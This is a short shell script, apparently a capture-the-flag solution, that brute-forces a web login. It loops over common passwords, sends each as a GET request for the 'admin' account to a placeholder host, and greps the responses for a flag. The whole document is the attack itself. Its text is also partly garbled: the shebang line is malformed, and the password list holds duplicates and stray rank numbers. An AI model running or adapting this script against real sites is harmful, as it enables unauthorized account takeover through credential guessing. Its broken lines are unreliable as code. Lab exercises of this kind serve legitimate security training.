#!' '/bin/sh

for pass in 'password' 'abc123' 'qwerty' '111111' 'adobe123' '1234' '123123' '1234567' 'login' '1234567890' 'admin' '13' 'iloveyou' '1234567' 'welcome' '14' '111111' 'abc123' '666666' '15' 'photoshop' '111111' '1qaz2wsx' 'admin' '16' 'ashley' '123123' '1234' 'mustang' '121212' 'starwars' 'bailey' 'welcome' 'access' 'flower' '123123' '18' 'passw0rd' 'shadow' 'monkey' 'letmein' '654321' '123123' 'football' '12345' 'michael' 'login' 'sunshine' 'master' '!@#$%^&*' '21' '654321' 'jesus' 'password1' 'superman' 'princess' 'master' 'hello' 'charlie' '22' 'superman' 'michael' 'princess' '696969' 'qwertyuiop' 'hottie' 'freedom' 'aa123456' '23' 'qazwsx' 'ninja' 'azerty' '123123' 'solo' 'loveme' 'whatever' 'donald' '24' 'michael' 'mustang' 'trustno1' 'batman' 'passw0rd' 'zaq1zaq1' 'qazwsx' 'Football' '000000' 'starwars' 'password1' 'trustno1' 'qwerty123'
do
	curl "[ip_site]/?page=signin&username=admin&password=$pass&Login=Login"  | grep flag
	echo $pass
done
